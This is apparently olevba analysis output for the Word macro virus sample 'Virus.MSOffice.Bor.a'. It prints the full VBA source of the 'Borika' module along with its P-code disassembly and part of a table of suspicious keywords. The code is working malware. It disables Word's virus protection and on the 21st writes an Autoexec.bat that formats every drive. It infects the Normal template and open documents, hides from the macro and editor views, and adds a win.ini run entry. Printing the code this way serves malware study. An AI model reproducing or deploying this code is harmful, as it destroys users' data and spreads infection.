olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Bor.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Bor.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Borika.bas 
in file: Virus.MSOffice.Bor.a - OLE stream: 'Macros/VBA/Borika'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'MyName = Borika.Macro_Format
'WrittenBy = Borika from Kz (Ust-Kamenogorsk)
'Version = 1.0
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If ShowVisualBasicEditor Then Application.Quit True
Call WeTrustInGod
End Sub

Sub WeTrustInGod()
On Error Resume Next
Bat = "C:\Autoexec.bat"
    If Day(Date) = 21 Then
    SetAttr Dat, vbNormal
    Kill Bat
    Open Bat For Output As #2
      Print #2, "@echo off"
     For I = 99 To 122
      Print #2, "format " & Chr(I) & ": /autotest /q > nul"
     Next I
     Print #2, "format a: /autotest /q > nul"
     Print #2, "format b: /autotest /q > nul"
     Print #2, "cls"
     For I = 0 To 9
      Print #2, "echo."
     Next I
     Print #2, "echo                           Borika.Macro_Format Virus"
    Close #2
    End If
End Sub

Sub AutoClose()
On Error Resume Next
windir = Environ("windir")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

Call Exp

If NormalTemplate.VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
NormalTemplate.VBProject.VBComponents.Import (windir & "\~$ad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
ActiveDocument.VBProject.VBComponents.Import (windir & "\~$ad.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If
End Sub

Sub ToolsMacro()
On Error Resume Next
windir = Environ("windir")

Call Hide

For X = 1 To NormalTemplate.VBProject.VBComponents("Borika").CodeModule.CountOfLines - 1
 CodeNT = CodeNT & NormalTemplate.VBProject.VBComponents("Borika").CodeModule.Lines(X, 1) & Chr(13)
Next X

NormalTemplate.VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Borika").CodeModule.CountOfLines
NormalTemplate.Saved = True

If Documents.Count >= 1 Then
 For Y = 1 To ActiveDocument.VBProject.VBComponents("Borika").CodeModule.CountOfLines - 1
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Borika").CodeModule.Lines(Y, 1) & Chr(13)
 Next Y

 For X = 1 To Documents.Count
 Documents(X).VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("Borika").CodeModule.CountOfLines
 Documents(X).Saved = True
 Next X
End If

Dialogs(wdDialogToolsMacro).Show

If Not ShowVisualBasicEditor Then
 NormalTemplate.VBProject.VBComponents("Borika").CodeModule.InsertLines 1, CodeNT
 NormalTemplate.Save
 If NormalTemplate.VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
  NormalTemplate.VBProject.VBComponents.Import (windir & "\~$ad.dll")
  NormalTemplate.Save
 End If
 
  If Documents.Count >= 1 Then
    For X = 1 To Documents.Count
     Documents(X).VBProject.VBComponents("Borika").CodeModule.InsertLines 1, CodeAD
     Documents(X).SaveAs Documents(X).FullName
     If Documents(X).VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
      Documents(X).VBProject.VBComponents.Import (windir & "\~$ad.dll")
      Documents(X).SaveAs Documents(X).FullName
     End If
    Next X
  End If
End If
End Sub

Sub ViewVBCode()
On Error Resume Next
Call Hide
NormalTemplate.VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Borika").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Borika")
NormalTemplate.Saved = True
If Application.Documents.Count >= 1 Then
For X = 1 To Application.Documents.Count
Documents(X).VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("Borika").CodeModule.CountOfLines
Documents(X).Saved = True
Documents(X).VBProject.VBComponents.Remove Documents(X).VBProject.VBComponents("Borika")
Documents(X).Saved = True
Next X
End If
Application.ShowVisualBasicEditor = True
End Sub

Sub Hide()
On Error Resume Next
windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "The Borika"

Open windir & "\Win.ini" For Input As #1
Infected = False
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "run=Borika.vbs" Then
  Infected = True
 End If
Loop
Close #1

If Not Infected Then
 Open windir & "\win.ini" For Input As #1
 Open "c:\Win._ni" For Output As #2
 Do While Not EOF(1)
  Line Input #1, Line
  If Line = "[windows]" Then
   Print #2, Line
   Print #2, "run=Borika.vbs"
  Else
   Print #2, Line
  End If
 Loop
 Close #1
 Close #2
End If

FileCopy "c:\win._ni", windir & "\Win.ini"
Kill "c:\win._ni"

If Dir(windir & "\Borika.vbs") <> "" Then Kill windir & "\Borika.vbs"

Open windir & "\Borika.vbs" For Append As #1
Print #1, "on error resume next"
Print #1, "set wordobj = createobject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "wordobj.options.savenormalprompt = false"
Print #1, "wordobj.normaltemplate.vbproject.vbcomponents.remove wordobj.normaltemplate.vbproject.vbcomponents(" & Chr(34) & "Borika" & Chr(34) & ")"
Print #1, "wordobj.normaltemplate.vbproject.vbcomponents.import (" & Chr(34) & windir & "\~$ad.dll" & Chr(34) & ")"
Print #1, "wordobj.normaltemplate.save"
Print #1, "wordobj.quit"
Close #1

Call Exp
End Sub

Sub Exp()
On Error Resume Next
windir = Environ("windir")
If Dir(windir & "\~$ad.dll") <> "" Then Kill (windir & "\~$ad.dll")
ActiveDocument.VBProject.VBComponents("Borika").Export (windir & "\~$ad.dll")
NormalTemplate.VBProject.VBComponents("Borika").Export (windir & "\~$ad.dll")
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Bor.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Borika - 9823 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x001C "MyName = Borika.Macro_Format"
' Line #2:
' 	QuoteRem 0x0000 0x002C "WrittenBy = Borika from Kz (Ust-Kamenogorsk)"
' Line #3:
' 	QuoteRem 0x0000 0x000D "Version = 1.0"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	Ld ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' 	EndIf 
' Line #8:
' 	ArgsCall (Call) WeTrustInGod 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Sub WeTrustInGod())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St Bat 
' Line #14:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	IfBlock 
' Line #15:
' 	Ld Dat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #16:
' 	Ld Bat 
' 	ArgsCall Kill 0x0001 
' Line #17:
' 	Ld Bat 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #18:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #19:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0063 
' 	LitDI2 0x007A 
' 	For 
' Line #20:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "format "
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0014 ": /autotest /q > nul"
' 	Concat 
' 	PrintItemNL 
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "format a: /autotest /q > nul"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "format b: /autotest /q > nul"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #25:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0009 
' 	For 
' Line #26:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #27:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "echo                           Borika.Macro_Format Virus"
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Sub AutoClose())
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #36:
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #40:
' Line #41:
' 	ArgsCall (Call) Exp 0x0000 
' Line #42:
' Line #43:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001D "'MyName = Borika.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #44:
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #45:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001D "'MyName = Borika.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #48:
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Sub ToolsMacro())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #56:
' Line #57:
' 	ArgsCall (Call) Hide 0x0000 
' Line #58:
' Line #59:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #60:
' 	Ld CodeNT 
' 	Ld X 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CodeNT 
' Line #61:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' Line #63:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #64:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #65:
' Line #66:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #68:
' 	Ld CodeAD 
' 	Ld Y 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CodeAD 
' Line #69:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' Line #71:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #72:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Borika"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #73:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #74:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	EndIfBlock 
' Line #76:
' Line #77:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #78:
' Line #79:
' 	Ld ShowVisualBasicEditor 
' 	Not 
' 	IfBlock 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld CodeNT 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #82:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001D "'MyName = Borika.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #83:
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #84:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	EndIfBlock 
' Line #86:
' Line #87:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #88:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #89:
' 	LitDI2 0x0001 
' 	Ld CodeAD 
' 	LitStr 0x0006 "Borika"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #90:
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #91:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001D "'MyName = Borika.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #92:
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	Paren 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #93:
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	EndSub 
' Line #99:
' Line #100:
' 	FuncDefn (Sub ViewVBCode())
' Line #101:
' 	OnError (Resume Next) 
' Line #102:
' 	ArgsCall (Call) Hide 0x0000 
' Line #103:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #104:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #105:
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #106:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #107:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #108:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #109:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Borika"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Borika"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #110:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #111:
' 	LitStr 0x0006 "Borika"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #112:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #113:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Sub Hide())
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #121:
' Line #122:
' 	LitStr 0x000A "The Borika"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #123:
' Line #124:
' 	Ld windir 
' 	LitStr 0x0008 "\Win.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #125:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #126:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #127:
' 	LitDI2 0x0001 
' 	Ld Like 
' 	LineInput 
' Line #128:
' 	Ld Like 
' 	LitStr 0x000E "run=Borika.vbs"
' 	Eq 
' 	IfBlock 
' Line #129:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	Loop 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #133:
' Line #134:
' 	Ld Infected 
' 	Not 
' 	IfBlock 
' Line #135:
' 	Ld windir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #136:
' 	LitStr 0x000A "c:\Win._ni"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #137:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #138:
' 	LitDI2 0x0001 
' 	Ld Like 
' 	LineInput 
' Line #139:
' 	Ld Like 
' 	LitStr 0x0009 "[windows]"
' 	Eq 
' 	IfBlock 
' Line #140:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "run=Borika.vbs"
' 	PrintItemNL 
' Line #142:
' 	ElseBlock 
' Line #143:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Loop 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #147:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #148:
' 	EndIfBlock 
' Line #149:
' Line #150:
' 	LitStr 0x000A "c:\win._ni"
' 	Ld windir 
' 	LitStr 0x0008 "\Win.ini"
' 	Concat 
' 	ArgsCall FileCopy 0x0002 
' Line #151:
' 	LitStr 0x000A "c:\win._ni"
' 	ArgsCall Kill 0x0001 
' Line #152:
' Line #153:
' 	Ld windir 
' 	LitStr 0x000B "\Borika.vbs"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000B "\Borika.vbs"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #154:
' Line #155:
' 	Ld windir 
' 	LitStr 0x000B "\Borika.vbs"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "set wordobj = createobject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "wordobj.options.savenormalprompt = false"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "wordobj.normaltemplate.vbproject.vbcomponents.remove wordobj.normaltemplate.vbproject.vbcomponents("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Borika"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "wordobj.normaltemplate.vbproject.vbcomponents.import ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld windir 
' 	Concat 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "wordobj.normaltemplate.save"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "wordobj.quit"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #164:
' Line #165:
' 	ArgsCall (Call) Exp 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub Exp())
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #171:
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #172:
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Borika"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #173:
' 	Ld windir 
' 	LitStr 0x0009 "\~$ad.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Borika"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #174:
' 	EndSub 
' Line #175:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
